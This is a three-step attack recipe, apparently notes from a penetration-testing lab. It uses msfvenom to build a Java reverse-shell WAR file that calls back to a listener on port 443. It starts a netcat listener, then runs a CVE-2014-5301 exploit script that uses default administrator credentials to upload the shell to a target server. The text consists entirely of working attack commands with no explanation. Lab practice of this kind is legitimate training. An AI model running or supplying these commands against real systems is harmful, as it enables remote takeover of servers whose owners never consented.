1. Make a war reverseshell
   ```
   msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.205 LPORT=443 -f war > shell.war
   ```
2. Get reverse connection
   ```
   nc -lnvp 443
   ```
3. run the exploit
   ```
   python3 CVE-2014-5301.py 192.168.239.43 8080 administrator administrator shell.war
   ```
